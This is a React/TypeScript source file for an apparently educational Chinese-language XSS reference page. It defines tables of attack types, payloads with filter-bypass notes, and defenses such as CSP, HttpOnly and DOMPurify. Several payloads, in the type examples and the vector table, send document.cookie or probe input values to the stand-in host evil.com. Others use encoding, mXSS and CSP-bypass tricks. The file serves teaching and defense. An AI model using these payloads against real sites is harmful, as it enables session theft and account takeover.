import React from 'react';
import { Tag, Typography } from 'antd';

// ═══════════════════════════════════════════
// XSS 攻击类型
// ═══════════════════════════════════════════

export interface XssType {
  key: string;
  name: string;
  nameEn: string;
  severity: '严重' | '高危' | '中危' | '低危';
  persistence: '持久化' | '非持久化';
  trigger: '服务端' | '客户端' | '混合';
  description: string;
  realWorldExample: string;
}

export const xssTypes: XssType[] = [
  {
    key: 'stored',
    name: '存储型 XSS',
    nameEn: 'Stored / Persistent XSS',
    severity: '严重',
    persistence: '持久化',
    trigger: '服务端',
    description:
      '恶意脚本被永久存储在目标服务器上（数据库、消息队列、评论系统、用户资料等），每次用户访问包含该数据的页面时脚本都会执行。危害最大——对所有访问者生效，无需社工诱导。',
    realWorldExample:
      '2014 年 TweetDeck 存储型 XSS——攻击者在推文中嵌入恶意 JS，所有在 TweetDeck 中查看该推文的用户浏览器都执行了脚本，形成 XSS 蠕虫（超 10000 条二次传播）。',
  },
  {
    key: 'reflected',
    name: '反射型 XSS',
    nameEn: 'Reflected XSS',
    severity: '高危',
    persistence: '非持久化',
    trigger: '服务端',
    description:
      '恶意脚本在 HTTP 请求参数中（URL query string、POST body），服务端将参数值直接拼入响应 HTML 回显。需要攻击者诱导用户点击构造的链接（钓鱼邮件、IM 消息等）。',
    realWorldExample:
      '银行登录页 `/login?error=<script>...</script>`——服务端直接将 error 值嵌入 HTML 回显，用户点击恶意链接后脚本在银行域名下执行。',
  },
  {
    key: 'dom-based',
    name: 'DOM 型 XSS',
    nameEn: 'DOM-based XSS',
    severity: '高危',
    persistence: '非持久化',
    trigger: '客户端',
    description:
      '恶意载荷不在服务端响应中，通过客户端 JS 动态操作 DOM 时引入（innerHTML、document.write、eval、location.hash 等）。服务端日志中无攻击痕迹，是检测盲区。',
    realWorldExample:
      '前端代码 `$("#name").html(location.hash.slice(1))`——攻击者构造 `#<img src=x onerror=alert(1)>`，服务端正常返回页面，JS 读取 hash 并插入 DOM 时触发。',
  },
  {
    key: 'mxss',
    name: '突变 XSS（mXSS）',
    nameEn: 'Mutation XSS',
    severity: '严重',
    persistence: '混合',
    trigger: '混合',
    description:
      '浏览器 HTML 解析器的自动修正行为导致原本安全的 HTML 字符串在解析/重写后变为恶意。DOMPurify 等清理库也无法防御——因为清理对象是原始字符串，浏览器变异后内容已不同。',
    realWorldExample:
      '`<listing>&lt;img src=x onerror=alert(1)&gt;</listing>`——清理后看起来安全（实体编码），但 `<listing>` 标签改变了解析模式，浏览器重新解析时实体被解码为实际标签。',
  },
  {
    key: 'dom-clobbering',
    name: 'DOM Clobbering',
    nameEn: 'DOM Clobbering',
    severity: '高危',
    persistence: '非持久化',
    trigger: '客户端',
    description:
      '利用 HTML 元素的 id/name 属性在全局作用域中创建同名变量，覆盖 JS 代码中的全局变量。不需要注入 script 标签——仅靠合法 HTML 元素就能改变代码执行逻辑。',
    realWorldExample:
      '`<img id="config"><img id="config" name="apiUrl" value="https://evil.com">`——代码中 `config.apiUrl` 被 HTML 元素的 name 属性覆盖，API 请求被重定向到攻击者服务器。',
  },
  {
    key: 'css-based',
    name: '基于 CSS 的 XSS',
    nameEn: 'CSS-based XSS',
    severity: '中危',
    persistence: '混合',
    trigger: '混合',
    description:
      '注入恶意 CSS 窃取页面敏感数据。利用属性选择器配合 background-image URL，逐字符探测 input 的 value 属性，将匹配到的数据通过 URL 外传给攻击者服务器。',
    realWorldExample:
      '`input[value^="a"] { background: url("https://evil.com/steal?a"); }`——CSS 逐字符嗅探 input value，配合 @keyframes 动画甚至可自动化探测长字符串。',
  },
  {
    key: 'rich-text',
    name: '富文本 XSS',
    nameEn: 'Rich Text XSS',
    severity: '高危',
    persistence: '持久化',
    trigger: '混合',
    description:
      '富文本编辑器允许用户使用 HTML 格式化内容，但攻击者利用这一功能嵌入恶意标签（script、iframe、事件处理器）。简单的黑名单过滤（去掉 `<script>`）远远不够。',
    realWorldExample:
      '`<img src=x onerror="fetch(\'https://evil.com/steal?c=\'+document.cookie)">`——绕过只过滤 `<script>` 的黑名单，利用 `<img>` 的 onerror 事件执行任意 JS。',
  },
  {
    key: 'charset-based',
    name: '字符集 XSS',
    nameEn: 'Charset-based XSS',
    severity: '高危',
    persistence: '非持久化',
    trigger: '服务端',
    description:
      '利用浏览器字符集自动检测或声明不当的字符集来绕过输出编码。UTF-7 编码的 `<script>` 标签在浏览器以 UTF-7 解析时会被执行，而服务端安全过滤基于 UTF-8 完全无法察觉。',
    realWorldExample:
      '响应头缺少 charset，攻击者注入 UTF-7 编码 payload（`+ADw-script+AD4-`），浏览器尝试用 UTF-7 解析时还原为 `<script>` 标签并执行。',
  },
  {
    key: 'blind-xss',
    name: '盲 XSS',
    nameEn: 'Blind XSS',
    severity: '严重',
    persistence: '持久化',
    trigger: '服务端',
    description:
      '攻击者将恶意载荷注入到不直接可见的后台页面（客服反馈表单、日志查看页、管理员审核面板）。普通用户看不到效果，但当管理员/内部员工访问后台时脚本执行。常用于窃取管理员 Cookie。',
    realWorldExample:
      '在反馈表单提交 `<script>new Image().src="https://evil.com/log?c="+document.cookie</script>`——管理员在后台审核时脚本执行，Cookie 被窃。',
  },
  {
    key: 'self-xss',
    name: '自 XSS / 社工 XSS',
    nameEn: 'Self-XSS',
    severity: '低危',
    persistence: '非持久化',
    trigger: '客户端',
    description:
      '需要受害者自己在浏览器控制台中粘贴并执行恶意代码。攻击者通过社工手段诱导，如"复制这段代码到 Console 可以查看隐身访问"。Facebook 等平台的 Self-XSS 社工攻击屡见不鲜。',
    realWorldExample:
      '攻击者发消息："复制这段代码到 Console，可以看谁访问了你的主页！"——实际代码是 `document.location="https://evil.com?c="+document.cookie`。',
  },
  {
    key: 'svg-html5',
    name: 'SVG / HTML5 新标签 XSS',
    nameEn: 'SVG & HTML5 Vector XSS',
    severity: '高危',
    persistence: '混合',
    trigger: '混合',
    description:
      'SVG 内部可嵌入 `<script>` 和事件处理器（如 `<svg/onload=...>`）。HTML5 引入了大量新标签和事件属性（video、audio、details），每个都可能成为 XSS 注入点。黑名单防御完全失效。',
    realWorldExample:
      '`<svg><animate onbegin=alert(1) attributeName=x dur=1s>`——SVG 动画事件触发 JS。`<details open ontoggle=alert(1)>`——HTML5 details 的 toggle 事件。',
  },
];

// ═══════════════════════════════════════════
// XSS 攻击向量（Payload）表
// ═══════════════════════════════════════════

export interface XssVector {
  key: string;
  category: string;
  tag: string;
  payload: string;
  description: string;
  bypassMethod: string;
}

export const xssVectors: XssVector[] = [
  {
    key: 'script-basic',
    category: '基础注入',
    tag: '<script>',
    payload: '<script>alert(document.cookie)</script>',
    description: '最经典 payload——直接嵌入 script 标签执行任意 JS',
    bypassMethod: '大小写混合 `<ScRiPt>`、嵌套 `<scr<script>ipt>`、编码绕过',
  },
  {
    key: 'img-onerror',
    category: '事件处理器',
    tag: '<img>',
    payload: '<img src=x onerror="fetch(\'https://evil.com?c=\'+document.cookie)">',
    description: 'img 加载失败触发 onerror 执行 JS，绕过只过滤 script 的防御',
    bypassMethod: 'src 用 `/` 或 `""` 替代 `x`，onerror 编码为 HTML 实体',
  },
  {
    key: 'svg-onload',
    category: '事件处理器',
    tag: '<svg>',
    payload: '<svg/onload=fetch("https://evil.com?c="+document.cookie)>',
    description: 'SVG onload 事件在元素加载后立即触发，不需要任何用户交互',
    bypassMethod: '`<svg><set onbegin=alert(1) attributeName=x>`——用 SVG 动画事件替代 onload',
  },
  {
    key: 'body-onload',
    category: '事件处理器',
    tag: '<body>',
    payload: '<body onload=alert(1)>',
    description: '页面 body 加载完成后触发，在富文本中绕过只过滤 script/img 的规则',
    bypassMethod:
      '数十种类似事件：onpageshow, onfocus, onblur, onscroll, onresize, oncopy, oncut, onpaste',
  },
  {
    key: 'iframe-srcdoc',
    category: '嵌入内容',
    tag: '<iframe>',
    payload: '<iframe srcdoc="<script>alert(1)</script>">',
    description: 'iframe srcdoc 可直接嵌入完整 HTML 文档，其中 script 可执行',
    bypassMethod: 'srcdoc 内的 HTML 实体编码后仍被解码执行',
  },
  {
    key: 'details-toggle',
    category: '事件处理器',
    tag: '<details>',
    payload: '<details open ontoggle=alert(1)>',
    description: 'HTML5 details 的 toggle 事件，open 属性使初始展开即触发',
    bypassMethod: '许多过滤规则未覆盖 HTML5 新标签和对应事件',
  },
  {
    key: 'marquee',
    category: '事件处理器',
    tag: '<marquee>',
    payload: '<marquee onstart=alert(1)>x</marquee>',
    description: 'marquee 标签的 onstart/onbounce/onfinish 事件可触发 JS',
    bypassMethod: '利用废弃但浏览器仍支持的标签绕过黑名单',
  },
  // ── 编码绕过 ──
  {
    key: 'hex-encode',
    category: '编码绕过',
    tag: '<img>',
    payload: '<img src=x onerror=&#97;&#108;&#101;&#114;&#116;(1)>',
    description: 'HTML 实体编码——"alert" 编码为十进制实体，浏览器解码后执行',
    bypassMethod: '混合编码：Hex、Decimal、命名实体混合使用',
  },
  {
    key: 'js-unicode',
    category: '编码绕过',
    tag: '<script>',
    payload: '<script>\\u0061lert(1)</script>',
    description: 'JS Unicode 转义——\\u0061 = "a"，在 JS 字符串上下文中解码',
    bypassMethod: 'JS 引擎支持多种转义：Unicode（\\u0061）、Hex（\\x61）、Octal（\\141）',
  },
  {
    key: 'url-encode',
    category: '编码绕过',
    tag: '<a>',
    payload: '<a href="javascript&#x3a;alert(1)">click</a>',
    description: 'URL 编码绕过——&#x3a; 解码为 ":"，href 中 javascript: 协议执行 JS',
    bypassMethod: '二次 URL 编码、混合编码（部分 URL 编码 + 部分 HTML 实体）',
  },
  {
    key: 'base-href',
    category: '编码绕过',
    tag: '<base>',
    payload: '<base href="https://evil.com/">',
    description: '篡改 base 标签的 href，使所有相对路径的 script/img 请求指向攻击者服务器',
    bypassMethod: 'base 标签不需闭合，可放在页面任何位置，难以被正则检测',
  },
  // ── 协议绕过 ──
  {
    key: 'data-uri',
    category: '协议绕过',
    tag: '<iframe>',
    payload: '<iframe src="data:text/html,<script>alert(1)</script>">',
    description: 'data: URI 在 iframe 或 object 中嵌入完整 HTML 页面并执行 JS',
    bypassMethod: 'Base64 编码：`data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==`',
  },
  {
    key: 'vbscript',
    category: '协议绕过',
    tag: '<img>',
    payload: '<img src="vbscript:msgbox(1)">',
    description: '旧版 IE（≤10）中 vbscript: 协议可在 img/iframe 等标签中执行 VBScript',
    bypassMethod: '仅 IE 特有，但国内银行/政府系统的 IE 遗留用户仍大量存在',
  },
  // ── CSP 绕过 ──
  {
    key: 'jsonp-csp',
    category: 'CSP 绕过',
    tag: '<script>',
    payload: '<script src="https://trusted-cdn.com/api?callback=alert(1)">',
    description:
      'CSP 允许加载的域的 JSONP 接口若允许自定义 callback，攻击者可劫持该接口执行任意 JS',
    bypassMethod: 'JSONP 接口的 callback 参数未做白名单校验',
  },
  {
    key: 'angular-csp',
    category: 'CSP 绕过',
    tag: 'Angular',
    payload: '<div ng-app ng-csp><div ng-click="$event.view.alert(1)">click</div></div>',
    description: 'AngularJS 的 ng-csp 模式本意适配 CSP，但 ng-click 等指令仍可执行 JS 表达式',
    bypassMethod: '利用 Angular 表达式沙箱的历史逃逸漏洞（已修复的高危 CVE）',
  },
  // ── DOM Clobbering ──
  {
    key: 'clobber-id',
    category: 'DOM Clobbering',
    tag: '<a>/<img>',
    payload: '<a id="config"><a id="config" name="env" href="https://evil.com/api">',
    description: '通过 id/name 属性覆盖 window 下的全局变量，`config.env.href` 指向攻击者服务器',
    bypassMethod: '多层嵌套：`<form id="x"><input name="y" value="evil">` 覆盖 `x.y.value`',
  },
  // ── mXSS 变异 ──
  {
    key: 'mxss-listing',
    category: 'mXSS',
    tag: '<listing>',
    payload: '<listing>&lt;img src=x onerror=alert(1)&gt;</listing>',
    description: 'listing 标签改变解析模式，浏览器重新解析时实体被解码为实际标签',
    bypassMethod: '类似标签：xmp、noscript、noframes、style、textarea',
  },
  {
    key: 'mxss-table',
    category: 'mXSS',
    tag: '<table>',
    payload: '<table><img src=x onerror=alert(1)></table>',
    description: 'table 的 HTML 解析器会为缺失的 tr/td 补充节点（Foster Parenting），导致 DOM 变异',
    bypassMethod: 'form、table、select 等元素有特殊解析规则，浏览器自动修复不规范 HTML',
  },
];

// ═══════════════════════════════════════════
// 防御方案
// ═══════════════════════════════════════════

export interface DefenseMethod {
  key: string;
  name: string;
  nameEn: string;
  layer: '代码层' | 'HTTP 层' | '浏览器层' | '框架层';
  effectiveness: string;
  description: string;
  limitation: string;
}

export const defenseMethods: DefenseMethod[] = [
  {
    key: 'output-encoding',
    name: '输出编码',
    nameEn: 'Context-Aware Output Encoding',
    layer: '代码层',
    effectiveness: '★★★★★',
    description:
      '根据输出上下文选择编码方式。React 的 JSX 默认对 `{}` 值做 HTML 编码，但 dangerouslySetInnerHTML 和 href/src 等属性不编码。关键原则：HTML 上下文用实体编码（`<` → `&lt;`），JS 上下文用 Unicode 转义（`"` → `\\x22`），URL 上下文用 percent-encoding。',
    limitation:
      '需开发者感知当前上下文并选正确编码方式，漏一个上下文就前功尽弃。多步渲染（HTML → JS 解码 → 再渲染）容易遗漏中间步骤。',
  },
  {
    key: 'csp',
    name: 'CSP 内容安全策略',
    nameEn: 'Content Security Policy',
    layer: 'HTTP 层',
    effectiveness: '★★★★★',
    description:
      "通过 HTTP 响应头声明资源白名单。`script-src 'self'` 禁外部脚本和内联脚本。`object-src 'none'` 禁用 Flash/Java。使用 nonce 或 hash 处理合法内联脚本。`report-uri /csp-report` 收集违规报告。",
    limitation:
      '配置复杂、容易遗漏指令。unsafe-inline 和 unsafe-eval 大幅削弱防护。需全站统一配置，混用多个框架难以精确控制。',
  },
  {
    key: 'httponly',
    name: 'HttpOnly Cookie',
    nameEn: 'HttpOnly Cookie',
    layer: 'HTTP 层',
    effectiveness: '★★★★☆',
    description:
      '`Set-Cookie: sessionId=xxx; HttpOnly; Secure; SameSite=Strict`——HttpOnly 禁止 JS 读取 document.cookie，XSS 即使注入成功也无法窃取 Session ID。但攻击者仍可用受害者浏览器直接发起请求。',
    limitation:
      '只保护 Cookie，不保护 localStorage/IndexedDB/memory 中的 Token。XSS 仍可发起请求。不防 CSRF。',
  },
  {
    key: 'trusted-types',
    name: 'Trusted Types',
    nameEn: 'Trusted Types',
    layer: '浏览器层',
    effectiveness: '★★★★★',
    description:
      "浏览器级类型检查——innerHTML、document.write、创建 script 等危险 API 只接受 TrustedHTML 对象。即使 XSS 注入成功，恶意字符串也无法插入 DOM。配合 `require-trusted-types-for 'script'` 启用。",
    limitation:
      '较新浏览器特性（Chrome 83+）。需改造现有代码中所有 innerHTML 使用。第三方库（广告 SDK、埋点脚本）可能不兼容。',
  },
  {
    key: 'dompurify',
    name: 'DOMPurify',
    nameEn: 'DOMPurify',
    layer: '代码层',
    effectiveness: '★★★★☆',
    description:
      '前端最流行的 HTML 清理库。对用户提交的 HTML 做白名单过滤——只保留允许的标签和属性，剔除所有事件处理器和危险标签。基于 DOM 解析而非正则，速度极快。`DOMPurify.sanitize(dirty, {{ALLOWED_TAGS: [], ALLOWED_ATTR: []}})`。',
    limitation:
      '无法防御 mXSS（变异发生在浏览器层面）。配置过宽可能留注入点。不能替代 CSP——应作为多层防御的一环。',
  },
  {
    key: 'sanitizer-api',
    name: 'Sanitizer API',
    nameEn: 'Sanitizer API',
    layer: '浏览器层',
    effectiveness: '★★★★★',
    description:
      '浏览器原生 HTML 清理 API——`new Sanitizer().sanitize(untrustedHTML)`。比 DOMPurify 更可靠（浏览器自己维护白名单）、性能更高、无需外部库。',
    limitation:
      '目前处于提案阶段，Chrome 105+ 实验性支持。生产环境建议先用 DOMPurify 作为 polyfill。',
  },
  {
    key: 'x-content-type',
    name: 'Content-Type 安全头',
    nameEn: 'X-Content-Type-Options',
    layer: 'HTTP 层',
    effectiveness: '★★★☆☆',
    description:
      '`X-Content-Type-Options: nosniff` 禁止浏览器 MIME 嗅探——若服务端声明为 text/plain，浏览器不会尝试当 HTML 解析。防上传的文本文件被旧浏览器误当 HTML 执行。',
    limitation:
      '只在浏览器做了 MIME 嗅探时有效。Chrome/Firefox 默认不对 text/plain 做嗅探，但旧版 IE 会。',
  },
  {
    key: 'frame-sandbox',
    name: '用户内容沙箱隔离',
    nameEn: 'Iframe Sandboxing',
    layer: '代码层',
    effectiveness: '★★★★☆',
    description:
      '将不可信的用户内容放在独立 sandbox iframe 中：`<iframe sandbox="allow-scripts" src="...">`。sandbox 限制 iframe 权限（无同源访问、无表单提交、无弹窗），即使 XSS 也不影响主页面。',
    limitation:
      '用户体验受影响（内容在 iframe 中，样式交互受限）。跨 iframe 通信复杂。增加内存和性能开销。',
  },
];

// ═══════════════════════════════════════════
// 表格列定义
// ═══════════════════════════════════════════

export const xssTypeColumns = [
  {
    title: '攻击类型',
    dataIndex: 'name',
    key: 'name',
    width: 150,
    render: (text: string, record: XssType) => (
      <>
        <Typography.Text strong>{text}</Typography.Text>
        <br />
        <Typography.Text type="secondary" style={{ fontSize: 12 }}>
          {record.nameEn}
        </Typography.Text>
      </>
    ),
  },
  {
    title: '危害',
    dataIndex: 'severity',
    key: 'severity',
    width: 70,
    render: (level: string) => {
      const m: Record<string, string> = {
        严重: 'red',
        高危: 'volcano',
        中危: 'gold',
        低危: 'blue',
      };
      return <Tag color={m[level]}>{level}</Tag>;
    },
  },
  {
    title: '持久化',
    dataIndex: 'persistence',
    key: 'persistence',
    width: 80,
    render: (p: string) => <Tag color={p === '持久化' ? 'red' : 'blue'}>{p}</Tag>,
  },
  {
    title: '触发端',
    dataIndex: 'trigger',
    key: 'trigger',
    width: 80,
    render: (t: string) => (
      <Tag color={t === '服务端' ? 'orange' : t === '混合' ? 'purple' : 'cyan'}>{t}</Tag>
    ),
  },
  {
    title: '原理说明',
    dataIndex: 'description',
    key: 'description',
    ellipsis: true,
  },
];

export const vectorColumns = [
  {
    title: '分类',
    dataIndex: 'category',
    key: 'category',
    width: 90,
    render: (cat: string) => <Tag>{cat}</Tag>,
  },
  {
    title: '标签/技术',
    dataIndex: 'tag',
    key: 'tag',
    width: 100,
    render: (tag: string) => (
      <Typography.Text code style={{ fontSize: 12 }}>
        {tag}
      </Typography.Text>
    ),
  },
  {
    title: 'Payload',
    dataIndex: 'payload',
    key: 'payload',
    width: 300,
    render: (payload: string) => (
      <Typography.Text
        code
        copyable
        style={{
          fontSize: 11,
          wordBreak: 'break-all',
          display: 'block',
          maxWidth: 300,
          maxHeight: 60,
          overflow: 'auto',
        }}
      >
        {payload}
      </Typography.Text>
    ),
  },
  { title: '说明', dataIndex: 'description', key: 'description', ellipsis: true },
  { title: '绕过思路', dataIndex: 'bypassMethod', key: 'bypassMethod', width: 220, ellipsis: true },
];

export const defenseColumns = [
  {
    title: '防御方案',
    dataIndex: 'name',
    key: 'name',
    width: 150,
    render: (text: string, record: DefenseMethod) => (
      <>
        <Typography.Text strong>{text}</Typography.Text>
        <br />
        <Typography.Text type="secondary" style={{ fontSize: 12 }}>
          {record.nameEn}
        </Typography.Text>
      </>
    ),
  },
  {
    title: '层级',
    dataIndex: 'layer',
    key: 'layer',
    width: 80,
    render: (l: string) => <Tag>{l}</Tag>,
  },
  { title: '效果', dataIndex: 'effectiveness', key: 'effectiveness', width: 80 },
  { title: '原理', dataIndex: 'description', key: 'description', ellipsis: true },
  { title: '局限', dataIndex: 'limitation', key: 'limitation', width: 280, ellipsis: true },
];
